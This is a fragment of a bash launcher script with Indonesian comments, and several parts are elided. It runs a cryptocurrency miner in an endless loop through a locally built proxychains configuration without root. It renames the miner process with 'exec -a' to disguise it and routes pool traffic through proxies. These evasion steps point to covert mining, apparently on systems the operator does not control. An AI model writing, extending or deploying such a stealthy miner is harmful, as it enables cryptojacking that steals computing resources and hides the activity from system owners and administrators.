...
# ====[ Buat proxychains.conf lokal jika belum ada ]====
PROXYCHAINS_CONF="./proxychains.conf"
if [ ! -f "$PROXYCHAINS_CONF" ]; then
    echo "[INFO] Membuat proxychains.conf lokal..."
...
# ====[ Export konfigurasi ke LD_PRELOAD agar tidak pakai -f ]====
...
echo "[INFO] Menjalankan miner melalui proxychains (konfigurasi lokal tanpa root)..."
while true; do
    echo "[INFO] $(date) :: Memulai mining..." >> "$LOG_FILE"

    proxychains bash -c "exec -a \"$PROCESS_NAME\" ./$BIN_NAME -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS" >> "$LOG_FILE" 2>&1 || true
